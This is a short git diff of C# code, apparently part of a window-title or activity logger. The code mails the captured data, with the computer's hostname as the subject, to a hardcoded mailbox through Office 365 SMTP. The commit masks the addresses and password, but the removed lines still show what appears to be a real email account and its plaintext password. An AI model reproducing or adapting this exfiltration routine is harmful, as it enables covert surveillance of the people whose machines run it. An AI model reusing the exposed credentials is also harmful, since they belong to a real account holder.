@@ -313,8 +313,8 @@ public static void GetActiveWindowTitle(object source, EventArgs e)
             }
             //发送邮件
             System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage(); //create the message
-            msg.To.Add("1402709211@qq.com");
-            msg.From = new MailAddress("tomridder716@hotmail.com", "tomridder", System.Text.Encoding.UTF8);
+            msg.To.Add("**************");
+            msg.From = new MailAddress("***********", "********", System.Text.Encoding.UTF8);
             string _ComputName = System.Net.Dns.GetHostName();
             msg.Subject = _ComputName;
             msg.SubjectEncoding = System.Text.Encoding.UTF8;
@@ -323,7 +323,7 @@ public static void GetActiveWindowTitle(object source, EventArgs e)
             msg.IsBodyHtml = false;
             msg.Priority = MailPriority.High;//邮件优先级 最高
             SmtpClient client = new SmtpClient(); //Network Credentials for Gmail
-            client.Credentials = new System.Net.NetworkCredential("tomridder716@hotmail.com", "1995521gcy");
+            client.Credentials = new System.Net.NetworkCredential("**********@hotmail.com", "************");
             client.Port = 587;
             client.Host = "smtp.office365.com";
             client.EnableSsl = true;
